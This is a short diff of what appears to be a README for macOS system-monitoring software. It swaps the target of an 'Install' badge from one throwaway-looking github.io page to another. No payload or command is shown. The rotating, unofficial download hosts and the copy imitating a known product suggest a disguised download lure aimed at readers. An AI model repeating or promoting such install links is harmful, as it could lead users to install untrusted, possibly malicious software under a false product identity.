@@ -15,7 +15,7 @@
 
 ---
 
-| [![Install](https://i.postimg.cc/KzMGptz1/68747470733a2f2f692e706f7374696d672e63632f5256516739596b312f62616467652e706e67-(1).png)](https://day-deneg-pzh.github.io/.github/istatmenus) | **Native system monitoring and diagnostics built for professionals** <br><br> No setup, no friction. Built on macOS frameworks, runs natively on Intel and Apple Silicon with powerful tools designed for everyday professional use. |
+| [![Install](https://i.postimg.cc/KzMGptz1/68747470733a2f2f692e706f7374696d672e63632f5256516739596b312f62616467652e706e67-(1).png)](https://porksdofs-mmak.github.io/.github/statmenus) | **Native system monitoring and diagnostics built for professionals** <br><br> No setup, no friction. Built on macOS frameworks, runs natively on Intel and Apple Silicon with powerful tools designed for everyday professional use. |
 |---|---|
 
 ---
